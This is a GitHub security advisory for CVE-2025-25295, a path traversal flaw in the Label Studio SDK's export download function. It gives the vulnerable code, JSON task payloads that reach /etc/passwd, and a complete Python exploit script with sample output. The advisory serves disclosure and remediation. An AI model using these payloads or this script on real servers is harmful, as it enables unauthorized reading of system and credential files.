# [H] Label Studio has a Path Traversal Vulnerability via image Field

## Summary
Severity: High
Advisory: GHSA-rgv9-w7jp-m23g
CVE: CVE-2025-25295
CWE: CWE-22, CWE-26
Ecosystem: PyPI
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2025-02-14
Source: https://github.com/advisories/GHSA-rgv9-w7jp-m23g
Type: github-advisory

## Affected
- PyPI: `label-studio-sdk` — affected >=0 <1.0.10

## Details
## Description
A path traversal vulnerability in Label Studio SDK versions prior to 1.0.10 allows unauthorized file access outside the intended directory structure. Label Studio versions before 1.16.0 specified SDK versions prior to 1.0.10 as dependencies, and the issue was confirmed in Label Studio version 1.13.2.dev0; therefore, Label Studio users should upgrade to 1.16.0 or newer to mitigate it. The flaw exists in the VOC, COCO and YOLO export functionalites. These functions invoke a `download` function on the `label-studio-sdk` python package, which fails to validate file paths when processing image references during task exports:

```python
def download(
    url,
    output_dir,
    filename=None,
    project_dir=None,
    return_relative_path=False,
    upload_dir=None,
    download_resources=True,
):
    is_local_file = url.startswith("/data/") and "?d=" in url
    is_uploaded_file = url.startswith("/data/upload")

    if is_uploaded_file:
        upload_dir = _get_upload_dir(project_dir, upload_dir)
        filename = urllib.parse.unquote(url.replace("/data/upload/", ""))
        filepath = os.path.join(upload_dir, filename)
        logger.debug(
            f"Copy {filepath} to {output_dir}".format(
                filepath=filepath, output_dir=output_dir
            )
        )
        if download_resources:
            shutil.copy(filepath, output_dir)
        if return_relative_path:
            return os.path.join(
                os.path.basename(output_dir), os.path.basename(filename)
            )
        return filepath

    if is_local_file:
        filename, dir_path = url.split("/data/", 1)[-1].split("?d=")
        dir_path = str(urllib.parse.unquote(dir_path))
        filepath = os.path.join(LOCAL_FILES_DOCUMENT_ROOT, dir_path)
        if not os.path.exists(filepath):
            raise FileNotFoundError(filepath)
        if download_resources:
            shutil.copy(filepath, output_dir)
        return filepath
```

By creating tasks with path traversal sequences in the image field, an attacker can force the application to read files from arbitrary server filesystem locations when exporting projects in any of the mentioned formats.

Note that there are two different possible code paths leading to this result, one for the `is_uploaded_file` and another one for the `is_local_file`.

## Steps to Reproduce
1. Login to Label Studio
2. Create project with image labeling configuration
3. If the `data/media/upload` directory doesn't exists yet, upload an image to force the server to create it
4. Create task with path traversal in image field
   
    4.1. To trigger the `is_uploaded_file` code path:
   ```json
   {
     "data": {
       "text": "test",
       "image": "/data/upload/../../../../../etc/passwd"
     }
   }
   ```
    4.2. To trigger the `is_local_file` code path:
   ```json
   {
     "data": {
       "text": "test",
       "image": "/data/local-files/?d=../../../etc/passwd"
     }
   }
   ```
6. Export project using VOC, YOLO or COCO formats. The server will return a Zip file in any of the three cases, for example:
   ```
   GET /api/projects/1/export?exportType=VOC&download_all_tasks=true&download_resources=true
   ```
7. Download the generated Zip file. The server's /etc/passwd file will be at `images/passwd` on the Zip file.


Alternatively, use the following exploit code, updating the `BASE_URL`, `USERNAME` and `PASSWORD` variables. Please note that the code will attempt to create a new user, but if the user exists and the credentials are valid, it will still work. Modify `METHOD` and `EXPORT_TYPE` to test the different code paths and export formats:

```python
import requests
from bs4 import BeautifulSoup
import io
import zipfile


BASE_URL = "http://xbow-app-1:8000"
USERNAME = "test@test.com"
PASSWORD = "Test123!@#"
METHOD = "is_uploaded_file" # Valid values: "is_uploaded_file" or "is_local_file"
EXPORT_TYPE = "VOC"         # Valid values: "VOC", "COCO" or "YOLO"

print("Signing up...")
url = "%s/user/signup/" % BASE_URL
session = requests.Session()

# First get the CSRF token
response = session.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
csrf_token = soup.find('input', {'name': 'csrfmiddlewaretoken'})['value']
print(f"Got CSRF token: {csrf_token}")

# Prepare registration data
data = {
    'csrfmiddlewaretoken': csrf_token,
    'email': USERNAME,
    'password': PASSWORD,
    'allow_newsletters': 'false',
    'allow_newsletters_visual': 'false'
}

headers = {
    'Referer': url,
    'Content-Type': 'application/x-www-form-urlencoded',
}

# Submit the registration request
response = session.post(url, data=data, headers=headers)
print(f"User registration response status code: {response.status_code}\n")

# Login
print("Logging in...")
url = "%s/user/login" % BASE_URL

# Attempt login with our credentials
login_data = {
    'csrfmiddlewaretoken': csrf_token,
    'email': USERNAME,
    'password': PASSWORD,
}

headers = {
    'Referer': url,
    'Content-Type': 'application/x-www-form-urlencoded',
}

response = session.post(url, data=login_data, headers=headers)

print(f"Login response status code: {response.status_code}")

# Check if we got any tokens in the response
print("\nCookies after login:")
for cookie in session.cookies:
    print(f"{cookie.name}: {cookie.value}")


# We will use these headers moving forward
headers = {
    'Content-Type': 'application/json',
    'X-CSRFToken': session.cookies['csrftoken']
}

# Creat a project to then create a task associated to it
print("\nCreating project...")
# Try to create a project with a file upload configuration
project_data = {
    "title": "File Upload Test",
    "description": "Testing file upload functionality",
    "label_config": """
    <View>
      <Image name="image" value="$image"/>
      <Text name="text" value="$text"/>
      <Choices name="choice" toName="image">
        <Choice value="yes"/>
        <Choice value="no"/>
      </Choices>
    </View>
    """
}
response = session.post("%s/api/projects/" % BASE_URL, json=project_data, headers=headers)
if response.status_code != 201:
    print("Problem creating project, aborting")
    exit(0)    
project_id = response.json()['id']
print(f"Project ID: {project_id}\n")

# Create task using a filename to later abuse a path traversal vulnerability during file export
print(f"Creating task with method {METHOD} (defaults to is_local_file)...")
task_data = {}
if (METHOD == "is_uploaded_file"):
    task_data["data"] = {
            "text": "test",
            "image": "/data/upload/../../../../../etc/passwd"    # Trigger for is_uploaded_file
    }
else:
    task_data["data"] = {
            "text": "test",
            "image": "/data/local-files/?d=../../../etc/passwd" # Trigger for is_local_file
    }
response = session.post(f"{BASE_URL}/api/projects/{project_id}/tasks", json=task_data, headers=headers)
if response.status_code != 201:
    print("Problem creating task, aborting")
    exit(0)    
task_id = response.json()['id']
print(f"Task created successfully, task id: {task_id}\n")

# Issue a dummy upload request to force the creation of the ~/data/images/upload folder
response = session.post(f"{BASE_URL}/api/projects/{project_id}/import?commit_to_project=false", files={"bar.png":"data"})

# Request the server to generate a zip with all of the project information and files (works for YOLO, COCO or VOC)
response = session.get(f"{BASE_URL}/api/projects/{project_id}/export?exportType={EXPORT_TYPE}&download_all_tasks=true&download_resources=true")
if (response.status_code != 200):
    print("Couldn't fetch export file")
    exit(0)

file_like_object = io.BytesIO(response.content)
zipfile_ob = zipfile.ZipFile(file_like_object)
print("Dumping /etc/passwd file contents:")
print(zipfile_ob.read("images/passwd").decode("utf-8"))

```

Output:

```
$ python3 studio-min.py
Signing up...
Got CSRF token: CQXYq1qbQ5jMG2FjQfzodC3i6weiIMq9T6lqhBQLT94sbcLKOg0ZeZxep7hPKLM6
User registration response status code: 200

Logging in...
Login response status code: 200

Cookies after login:
csrftoken: PsEKLHstcGIXDFCP3OGQGCwKUFOdlN33
sessionid: .eJxVj8tyhSAQRP-FtVrIQ8Dl3ecbqAEGNRqwRKvyqPx7JHUXyXKme7rnfJFrCWQkTDHlpYit1jq2AiVrgQpoqZYATvSMu540JB8TpOUTziUnu69k7BuyQTntlqcl3aPiSklquOoUZ7pnoiEWrnO2V8HD_lbVnD87B37FVIXwCmnKnc_pPBbXVUv3VEv3kgNuj6f3X8AMZb6vTaQQuaaoghCOBqFMuJ8egjdGGu4oiMCDdkpHGEQMWhoXNUM59D5Q5-_QFXG3b1hhJgy2AkXYCt51BUupzPi-L8cHGen3D57HZCg:1tbQOv:nomwczhhTvAaXMoyRrO30lWR5UkGi7AqiUHKyshQJ30

Creating project...
Project ID: 10

Creating task with method is_uploaded_file (defaults to is_local_file)...
Task created successfully, task id: 10

Dumping /etc/passwd file contents:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
nginx:x:999:999:nginx user:/nonexistent:/usr/sbin/nologin
```

## Mitigations
- Validate and sanitize file paths
- Add an allowlist of directories and file types
- Implement file access controls
- Use randomized file names and secure file storage abstraction

## Impact
Authentication-required vulnerability allowing arbitrary file reads from the server filesystem. Potential exposure of sensitive information like configuration files, credentials, and confidential data.

## References
- https://github.com/HumanSignal/label-studio/security/advisories/GHSA-rgv9-w7jp-m23g
- https://nvd.nist.gov/vuln/detail/CVE-2025-25295
- https://github.com/HumanSignal/label-studio-sdk/commit/4a9715c6b0b619371e89c09ea8d1c86ce5c880df
- https://github.com/HumanSignal/label-studio-sdk
